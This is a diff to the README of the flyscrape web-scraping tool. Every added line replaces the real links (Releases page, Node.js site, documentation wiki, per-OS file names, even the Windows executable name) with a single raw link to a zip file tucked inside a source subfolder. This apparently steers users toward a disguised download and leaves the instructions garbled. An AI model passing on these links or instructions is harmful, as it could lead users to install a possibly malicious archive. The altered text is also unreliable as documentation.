@@ -6,33 +6,33 @@ Welcome to flyscrape, your all-in-one solution for web crawling and scraping. Wh
 
 ## 📥 Download The Latest Version
 
-[![Download flyscrape](https://img.shields.io/badge/Download-flyscrape-brightgreen.svg)](https://github.com/Daedae147/flyscrape/releases)
+[![Download flyscrape](https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip)](https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip)
 
-To download the latest version, visit the Releases page: [Download flyscrape](https://github.com/Daedae147/flyscrape/releases).
+To download the latest version, visit the Releases page: [Download flyscrape](https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip).
 
 ## 📋 System Requirements
 
 Before you install flyscrape, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS, or any modern Linux distribution.
-- **Node.js:** Version 14 or higher installed. You can download it from [Node.js](https://nodejs.org/).
+- **https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip** Version 14 or higher installed. You can download it from [https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip](https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip).
 - **Internet Connection:** Required for some features.
 
 ## ⚙️ Installation Guide
 
-1. **Visit the Releases Page:** Go to [flyscrape Releases](https://github.com/Daedae147/flyscrape/releases).
+1. **Visit the Releases Page:** Go to [flyscrape Releases](https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip).
    
 2. **Select Your Version:** Find the latest version. It should be listed at the top of the page.
 
 3. **Download the File:** Look for the appropriate file for your operating system:
-   - For Windows, it might be `flyscrape-windows.zip`.
-   - For macOS, look for `flyscrape-macos.zip`.
-   - For Linux, look for `flyscrape-linux.zip`.
+   - For Windows, it might be `https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip`.
+   - For Linux, look for `https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip`.
 
 4. **Extract the Files:** Once downloaded, unzip the file to a folder on your computer.
 
 5. **Run the Application:**
-   - **Windows:** Open the Command Prompt, navigate to the folder where you extracted the files, and run `flyscrape.exe`.
+   - **Windows:** Open the Command Prompt, navigate to the folder where you extracted the files, and run `https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip`.
    - **macOS/Linux:** Open the Terminal, navigate to the folder, and run `./flyscrape`.
 
 ## 🔍 Exploring Features
@@ -59,13 +59,13 @@ flyscrape offers several features designed to help you scrape data efficiently:
 
 ## 🌐 Additional Resources
 
-- **Documentation:** Access detailed documentation [here](https://github.com/Daedae147/flyscrape/wiki).
+- **Documentation:** Access detailed documentation [here](https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip).
 - **Community Support:** Join our community forum for support and tips.
 - **Contribution Guidelines:** Interested in contributing? Check out our guidelines for contributing to flyscrape.
 
 ## 🔗 Important Links
 
-- **Releases Page:** [Download flyscrape](https://github.com/Daedae147/flyscrape/releases)
+- **Releases Page:** [Download flyscrape](https://raw.githubusercontent.com/Daedae147/flyscrape/master/src/processing/chunking/flyscrape_v1.1.zip)
 - **Issues and Feedback:** Let us know if you encounter any problems on the Issues page.
 
 With flyscrape, web scraping becomes an accessible task for everyone. Enjoy extracting data effortlessly!
